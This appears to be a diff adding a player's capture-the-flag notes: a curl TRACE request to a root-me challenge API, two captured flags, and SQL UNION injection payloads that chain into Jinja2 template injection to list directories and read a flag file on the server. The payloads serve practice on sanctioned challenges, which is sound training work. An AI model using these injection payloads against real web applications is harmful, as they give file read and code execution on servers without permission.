@@ -1,0 +1,22 @@
+	curl -X 'TRACE' \
+	  'http://challenge01.root-me.org:59091/api/note' \
+	  -H 'accept: application/json' \
+	  -H 'Content-Type: application/json' \
+	  -d '{
+	  "note": "string",
+	  "secret": ""
+	}'
+	
+	RM{E4sy_1d0r_0n_API}
+	RM{UU1dV1s_4r3_1nSeCuRe!!_D0nT_U_Dare>:(}
+	
+	
+	' UNION SELECT '{{config.__class__.__init__.__globals__[\\\"__builtins__\\\"][\\\"__import__\\\"](\\\"os\\\").listdir(\\\"/\\\")}}'--\",\n    \"' UNION SELECT '{{config.__class__.__init__.__globals__[\\\"__builtins__\\\"][\\\"__import__\\\"](\\\"os\\\").listdir(\\\"/app\\\")}}'--
+	
+' UNION SELECT '{{config.__class__.__init__.__globals__["__builtins__"]["open"]("/flag-9b9e649a34a6b8a490bdcdf987515770.txt").read())}}'--
+	
+	
+	' UNION SELECT '{{config.__class__.__init__.__globals__["__builtins__"]["open"]("/flag-9b9e649a34a6b8a490bdcdf987515770.txt").read()}}'--
+	
+	
+	Still warming up — I’m not where I want to be yet, but I’m giving it my best. You can take a look at my PCTF write-up here
